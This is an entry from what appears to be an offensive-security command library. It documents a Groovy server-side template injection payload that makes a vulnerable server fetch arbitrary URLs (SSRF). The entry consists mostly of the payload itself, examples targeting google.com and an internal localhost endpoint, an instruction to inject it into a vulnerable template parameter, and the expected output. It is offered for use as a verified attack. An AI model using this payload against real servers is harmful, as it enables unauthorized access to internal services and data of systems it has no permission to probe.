---
type: command
executor: groovy
data: '${"http://$_TARGET_URL".toURL().text}'
output: null
tags:
  - ssti
  - groovy
  - ssrf
platforms:
  - web
  - java
verified: true
validated: true
---

# groovy-ssti-fetch-url-string-to-url

## Command

```groovy
${"http://$_TARGET_URL".toURL().text}
```

## Description

This Groovy expression converts a string representation of a URL into a URL object and retrieves its text content via an HTTP GET request. In an SSTI context, it executes on the server to perform SSRF, allowing the attacker to force outbound requests to arbitrary endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The target URL or hostname to fetch (e.g., www.google.com for testing, or an internal service for exploitation) | Yes |

## Examples

### Basic Usage

```groovy
${"http://www.google.com".toURL().text}
```

### Advanced Usage

```groovy
${"http://localhost:8080/internal".toURL().text}
```

Inject into a vulnerable template parameter to make the server fetch internal resources.

## Expected Output

The text content of the fetched URL, such as HTML from the homepage:

```
<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="en"><head><meta content="Search the world's information, including webpages, images, videos and more. Google has many special features to help you find exactly what you're looking for." name="description"/><meta content="/images/branding/googleg/1x/googleg_standard_color_128dp.png" itemprop="image"/><title>Google</title>...</html>
```

In SSTI, this may be partially or fully echoed in the response if the template renders the result.

## Related

- [[procedures/Server-Side-Template-Injection-via-Groovy-HTTP-Request]]
- [[commands/groovy-ssti-fetch-url-new-url-gettext]]
